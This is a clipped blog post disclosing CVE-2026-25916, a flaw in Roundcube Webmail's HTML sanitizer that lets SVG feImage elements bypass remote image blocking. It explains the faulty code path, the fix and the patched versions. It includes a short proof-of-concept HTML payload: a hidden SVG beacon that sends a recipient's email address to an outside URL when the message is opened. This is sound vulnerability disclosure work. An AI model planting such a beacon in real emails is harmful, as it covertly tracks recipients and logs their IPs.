---
title: Roundcube Webmail <1.5.13 / <1.6.13 allows attackers to force remote image loads via SVG feImage
source: https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/
author:
  - _NULL
published: 2026-02-08T00:00:00Z
created: 2026-02-12
description: Roundcube's HTML sanitizer doesn't treat SVG feImage href as an image source. Attackers can bypass remote image blocking to track email opens. (CVE-2026-25916)
tags:
  - clippings/articles
  - XSS
---
# Roundcube Webmail <1.5.13 / <1.6.13 allows attackers to force remote image loads via SVG feImage

![](https://nullcathedral.com/og-image.png)

> [!summary]+
> > A vulnerability (CVE-2026-25916) was discovered in Roundcube Webmail (versions < 1.5.13, 1.6.x < 1.6.13) where the `rcube_washtml` sanitizer failed to block external images loaded via the `<feImage>` SVG tag.
> While `<img>`, `<image>`, and `<use>` tags had their `href` or `src` attributes correctly blocked for remote resources, `<feImage>`'s `href` attribute was incorrectly handled by the `wash_link()` function, which allows HTTP/HTTPS URLs, instead of `is_image_attribute()` which blocks them.
> This allowed attackers to bypass the \"Block remote images\" setting, enabling them to track email opens, log IPs, and fingerprint browsers.
> The fix (commit `26d7677`) updated `is_image_attribute()` to include `<feImage>` in its regex for `href` attributes. Users are advised to update to Roundcube 1.5.13 or 1.6.13.

Roundcube's HTML sanitizer doesn't treat [SVG](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/SVG.md) `feImage` href as an image source. Attackers can bypass remote image blocking to track email opens. (CVE-2026-25916)

**TL;DR:** Roundcube’s `rcube_washtml` sanitizer blocked external resources on `<img>`, `<image>`, and `<use>`, but not on `<feImage>`. Its `href` went through the wrong code path and got allowed through. Attackers could track email opens even when “Block remote images” was on. Fixed in 1.5.13 and 1.6.13.

## Discovery[#](https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/#discovery)

I got bored during my christmas vacation and [this SVG-based XSS fix via the `animate` tag](https://roundcube.net/news/2025/12/13/security-updates-1.6.12-and-1.5.12) appeared on my radar. One SVG bug usually means more. [^1] 

So I spent some time going through `rcube_washtml.php`, looking at which SVG elements made it onto the allowlist and how their attributes get handled and sanitized.

`<feImage>` stood out.[^2] Its `href` gets fetched on render, same as `<img src>`.

## Proof of concept[#](https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/#proof-of-concept)

An invisible 1x1 SVG, positioned off-screen:

```html
<svg width="1" height="1" style="position:absolute;left:-9999px;">
  <defs>
    <filter id="t">
      <feImage href="https://httpbin.org/image/svg?email=victim@test.com"
               width="1" height="1"/>
    </filter>
  </defs>
  <rect filter="url(#t)" width="1" height="1"/>
</svg>
```


[^1]: The SVG spec is enormous and most sanitizers only handle the common elements. Whenever one SVG tag slips through, there are usually others on the same allowlist that nobody checked.

[^2]: It’s an SVG filter primitive that loads an external image and uses it as input to a filter chain ([spec](https://www.w3.org/TR/SVG11/filters.html#feImageElement)). Rarely used in practice, which is probably why it was overlooked. Allowlists that grow by hand tend to have gaps like this.